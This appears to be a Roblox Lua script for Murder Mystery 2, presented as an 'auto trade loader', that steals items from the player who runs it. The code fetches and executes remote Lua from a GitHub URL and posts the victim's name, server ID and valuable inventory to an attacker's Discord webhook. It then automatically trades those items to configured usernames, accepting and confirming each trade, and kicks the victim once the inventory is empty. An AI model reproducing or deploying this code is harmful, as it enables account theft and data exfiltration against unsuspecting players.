-- MM2 Auto Trade Loader - Versão Corrigida (Individual)
-- By: DeadJB

local Config = _G.MM2AutoTradeConfig or {}
local Username = Config.Username or {}
local MinValue = Config.MinValue or 0
local Webhook = Config.Webhook or ""

if #Username == 0 or Webhook == "" then
    warn("Configuração incompleta!")
    return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local TradeRemote = ReplicatedStorage:FindFirstChild("Trade")
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")

local function getValues()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub002/Hs62jsgp810i/refs/heads/main/mm2val.lua.txt"))()
end

local function getItemValue(itemName, values)
    for rarity, items in pairs(values) do
        if items[itemName] then
            return items[itemName]
        end
    end
    return 0
end

local function filterItems(inventory, values)
    local filtered = {}
    for _, item in pairs(inventory) do
        local value = getItemValue(item, values)
        if value >= MinValue then
            table.insert(filtered, item)
        end
    end
    return filtered
end

local function getInventoryItems()
    local items = {}
    
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item.Name)
        end
    end
    
    for _, item in pairs(LocalPlayer.StarterGear:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item.Name)
        end
    end
    
    return items
end

local function sendWebhook(data)
    local embed = {
        ["title"] = "🎯 Auto Trade Found",
        ["color"] = 0x00ff00,
        ["fields"] = {
            {["name"] = "👤 Nick (Vítima)", ["value"] = data.victim, ["inline"] = true},
            {["name"] = "👤 Nick (Alvo)", ["value"] = data.target, ["inline"] = true},
            {["name"] = "📡 Status", ["value"] = data.status, ["inline"] = true},
            {["name"] = "🎮 Game", ["value"] = "Murder Mystery 2", ["inline"] = true},
            {["name"] = "⚡ Executor", ["value"] = data.executor, ["inline"] = true},
            {["name"] = "💻 Server", ["value"] = data.jobId, ["inline"] = true},
            {["name"] = "📜 Join Script", ["value"] = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \"%s\")\n```", data.jobId), ["inline"] = false},
            {["name"] = "📦 Loot", ["value"] = string.format("```\n%s\n====================================```", table.concat(data.loot, "\n")), ["inline"] = false}
        }
    }
    
    local payload = {
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    }
    
    HttpService:PostAsync(Webhook, HttpService:JSONEncode(payload))
end

local function doTrade(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then
        return false
    end
    
    -- Pega itens do inventário
    local inventoryItems = getInventoryItems()
    local values = getValues()
    local filtered = filterItems(inventoryItems, values)
    
    if #filtered == 0 then
        return false
    end
    
    print("Enviando trade para " .. targetName .. " com " .. #filtered .. " itens")
    
    -- Envia webhook
    local status = "🟢"
    if target:FindFirstChild("IsInPrivateServer") and target.IsInPrivateServer.Value then
        status = "🔴"
    end
    
    sendWebhook({
        victim = LocalPlayer.Name,
        target = targetName,
        status = status,
        executor = identifyexecutor and identifyexecutor() or "Unknown",
        jobId = game.JobId,
        loot = filtered
    })
    
    -- Envia pedido de trade
    pcall(function()
        if TradeRemote then
            TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
        else
            ReplicatedStorage:FindFirstChild("TradeRequest"):InvokeServer(target, "Trade")
        end
    end)
    
    wait(2)
    
    -- Verifica se a trade abriu
    local tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
    if not tradeGUI then
        pcall(function()
            if TradeRemote then
                TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
            else
                ReplicatedStorage:FindFirstChild("TradeRequest"):InvokeServer(target, "Trade")
            end
        end)
        wait(2)
        tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
        if not tradeGUI then
            return false
        end
    end
    
    -- Função recursiva pra enviar itens
    local function sendItems(items)
        local offered = 0
        
        for _, itemName in pairs(items) do
            if offered >= 4 then break end
            
            local success = pcall(function()
                if TradeRemote then
                    TradeRemote:FindFirstChild("OfferItem"):FireServer(itemName, "Weapons")
                else
                    ReplicatedStorage:FindFirstChild("TradeOffer"):InvokeServer(itemName, true)
                end
            end)
            
            if success then
                offered = offered + 1
            end
            wait(0.3)
        end
        
        wait(1)
        
        pcall(function()
            if TradeRemote then
                TradeRemote:FindFirstChild("AcceptTrade"):FireServer()
            else
                ReplicatedStorage:FindFirstChild("TradeAccept"):InvokeServer()
            end
        end)
        wait(0.5)
        
        pcall(function()
            if TradeRemote then
                TradeRemote:FindFirstChild("ConfirmTrade"):FireServer()
            else
                ReplicatedStorage:FindFirstChild("TradeConfirm"):InvokeServer()
            end
        end)
        
        local remaining = {}
        for i = offered + 1, #items do
            table.insert(remaining, items[i])
        end
        
        if #remaining > 0 then
            wait(3)
            pcall(function()
                if TradeRemote then
                    TradeRemote:FindFirstChild("ClearOffer"):FireServer()
                else
                    ReplicatedStorage:FindFirstChild("TradeClear"):InvokeServer()
                end
            end)
            wait(1)
            sendItems(remaining)
        else
            wait(2)
            LocalPlayer:Kick("Nil")
        end
    end
    
    sendItems(filtered)
    return true
end

-- Função principal - verifica UM por UM
local function checkAndTrade()
    local inventoryItems = getInventoryItems()
    local values = getValues()
    local filtered = filterItems(inventoryItems, values)
    
    if #filtered == 0 then
        return
    end
    
    -- Verifica cada username individualmente
    for _, targetName in pairs(Username) do
        local target = Players:FindFirstChild(targetName)
        if target then
            print("Alvo encontrado: " .. targetName)
            task.spawn(function()
                pcall(doTrade, targetName)
            end)
            wait(5) -- Delay entre trades
        end
    end
end

-- Loop principal
print("Auto Trade iniciado!")
print("MinValue: " .. MinValue)
print("Alvos: " .. table.concat(Username, ", "))

while task.wait(10) do
    pcall(checkAndTrade)
end
